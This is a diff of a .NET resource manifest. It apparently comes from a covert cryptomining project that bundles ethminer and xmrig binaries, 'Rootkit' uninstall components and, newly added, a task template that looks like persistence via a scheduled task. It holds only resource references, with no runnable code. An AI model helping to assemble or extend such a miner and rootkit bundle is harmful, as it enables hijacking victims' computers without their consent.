@@ -172,12 +172,6 @@
   <data name="ethminer" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\Miners\ethminer.exe;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
   </data>
-  <data name="nvrtc64_112_0" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\Miners\nvrtc64_112_0.dll;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
-  </data>
-  <data name="nvrtc_builtins64_112" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\Miners\nvrtc-builtins64_112.dll;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
-  </data>
   <data name="xmrig" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\Miners\xmrig.exe;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
   </data>
@@ -204,5 +198,8 @@
   </data>
   <data name="Uninstall64" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\Rootkit\Uninstall64.exe;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+  <data name="TaskTemplate" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\TaskTemplate.xml;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;utf-16</value>
   </data>
 </root>
